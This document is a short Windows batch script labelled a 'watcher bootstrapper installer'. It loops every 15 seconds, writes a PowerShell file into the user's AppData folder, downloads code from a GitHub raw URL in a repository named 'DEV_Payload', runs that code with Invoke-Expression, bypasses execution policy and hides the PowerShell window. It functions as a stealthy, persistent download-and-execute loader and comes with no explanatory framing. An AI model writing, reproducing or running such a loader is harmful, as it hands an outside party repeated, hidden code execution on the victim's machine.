@echo off
:: ===============================================
:: UNIVERSAL WATCHER BOOTSTRAPPER INSTALLER LOOP
:: ===============================================

:loop
set "BOOTSTRAP=%APPDATA%\UniversalBatInstaller_Dynamic_15E1362D_E98B_4386_9CA9.ps1"

:: Re-write the bootstrapper script (overwrite every time)
echo ^$wc = New-Object System.Net.WebClient > "%BOOTSTRAP%"
echo ^$wc.Headers.Add("User-Agent", "Bootstrapper") >> "%BOOTSTRAP%"
echo ^$scriptUrl = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1" >> "%BOOTSTRAP%"
echo ^$code = ^$wc.DownloadString(^$scriptUrl) >> "%BOOTSTRAP%"
echo Invoke-Expression ^$code >> "%BOOTSTRAP%"

:: Run the script if it exists
if exist "%BOOTSTRAP%" (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BOOTSTRAP%"
)

:: Wait for 15 seconds before repeating
timeout /t 15 >nul
goto loop
